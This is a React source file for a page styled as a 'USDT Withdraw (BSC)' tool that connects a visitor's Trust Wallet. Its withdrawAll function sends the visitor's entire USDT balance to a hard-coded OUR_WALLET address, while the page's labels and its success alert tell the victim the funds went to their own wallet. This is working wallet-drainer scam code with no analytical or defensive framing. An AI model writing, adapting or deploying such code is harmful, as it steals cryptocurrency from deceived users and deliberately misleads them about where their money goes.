// App.js
import React, { useState } from "react";
import { ethers } from "ethers";

const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
const OUR_WALLET = "0x45e0c5af78c5ff0ff61cba8eb5a35507a31d5d6c";

// Minimal ABI: only balanceOf + transfer
const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)"
];

export default function App() {
  const [account, setAccount] = useState(null);
  const [balance, setBalance] = useState("0");
  const [decimals, setDecimals] = useState(18);

  // Connect wallet (Trust Wallet injection = window.ethereum)
  async function connectWallet() {
    if (!window.ethereum) {
      alert("Please open in Trust Wallet browser!");
      return;
    }
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const addr = await signer.getAddress();
    setAccount(addr);

    const token = new ethers.Contract(USDT_BSC, ERC20_ABI, provider);
    const bal = await token.balanceOf(addr);
    const dec = await token.decimals();
    setDecimals(dec);
    setBalance(ethers.formatUnits(bal, dec));
  }

  // Withdraw all USDT to your wallet
  async function withdrawAll() {
    if (!account) return;

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const token = new ethers.Contract(USDT_BSC, ERC20_ABI, signer);

    const bal = await token.balanceOf(account);
    if (bal <= 0n) {
      alert("No USDT to withdraw.");
      return;
    }

    try {
      const tx = await token.transfer(OUR_WALLET, bal);
      await tx.wait();
      alert("✅ All USDT withdrawn to your wallet!");
    } catch (err) {
      console.error(err);
      alert("❌ Transaction failed or cancelled");
    }
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-black text-white p-4">
      <h1 className="text-2xl mb-4">USDT Withdraw (BSC)</h1>

      {!account ? (
        <button
          onClick={connectWallet}
          className="px-6 py-2 bg-green-600 rounded-lg"
        >
          Connect Trust Wallet
        </button>
      ) : (
        <>
          <p className="mb-2">Connected: {account.slice(0, 6)}...{account.slice(-4)}</p>
          <p className="mb-4">USDT Balance: {balance}</p>
          <button
            onClick={withdrawAll}
            className="px-6 py-2 bg-red-600 rounded-lg"
          >
            Withdraw All USDT
          </button>
        </>
      )}
    </div>
  );
}
